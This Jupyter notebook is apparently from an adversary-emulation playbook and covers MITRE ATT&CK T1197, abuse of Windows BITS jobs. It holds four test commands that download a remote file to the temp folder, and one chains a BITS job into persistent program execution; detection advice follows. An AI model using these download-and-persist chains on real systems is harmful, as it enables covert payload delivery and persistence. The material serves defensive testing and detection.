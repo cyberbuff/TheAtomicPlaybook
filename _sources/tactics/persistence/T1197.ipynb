{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "134dddc3",
   "metadata": {},
   "source": "# T1197 - BITS Jobs\nAdversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)"
  },
  {
   "cell_type": "markdown",
   "id": "ec8bbc3c",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "05684066",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Bitsadmin Download (cmd)",
    "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nbitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4af00469",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "60868c62",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\bitsadmin1_flag.ps1 >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf12a8fb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "31c5b0b6",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Bitsadmin Download (PowerShell)",
    "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "defb5f6f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "887f6ab1",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\bitsadmin2_flag.ps1 -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b864174f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "56b74246",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Persist, Download, & Execute",
    "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nbitsadmin.exe /create AtomicBITS\nbitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin3_flag.ps1\nbitsadmin.exe /setnotifycmdline AtomicBITS C:\\Windows\\system32\\notepad.exe NULL\nbitsadmin.exe /resume AtomicBITS\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete AtomicBITS\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "11f1fe97",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "2f91ab5b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\bitsadmin3_flag.ps1 >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e45853d0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "94d9f53f",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd)",
    "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (\u201c-k netsvc -p -s BITS\u201d) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nset \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3f100c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "4186bbc9",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel C:\\Windows\\Temp\\Personalization\\LockScreenImage\\*.md >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04ec46ad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1197 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cdd505b2",
   "metadata": {},
   "source": "## Detection\nBITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>).(Citation: Microsoft BITS)\n\nMonitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the \u2018Transfer\u2019, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)"
  },
  {
   "cell_type": "markdown",
   "id": "a9012dd1",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Security Controls \n Alter security controls to make the system more or less vulnerable to attack. \n\n Manipulating security controls involves making configuration changes to the security settings of a system including things like modifying Group Policies, disabling/enabling autorun for removable media, and tightening or relaxing system firewalls, etc.\n#### Opportunity\nThere is an opportunity to use security controls on systems in order to affect the success of an adversary.\n#### Use Case\nA defender could use host-based tool to detect common persistence mechanisms and prevent the process from executing successfully.\n#### Procedures\nWeaken security controls on a system to allow for leaking of credentials via network connection poisoning.\nImplement policies on a system to prevent the insecure storage of passwords in the registry. This may force an adversary to revert these changes or find another way to access cached credentials.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}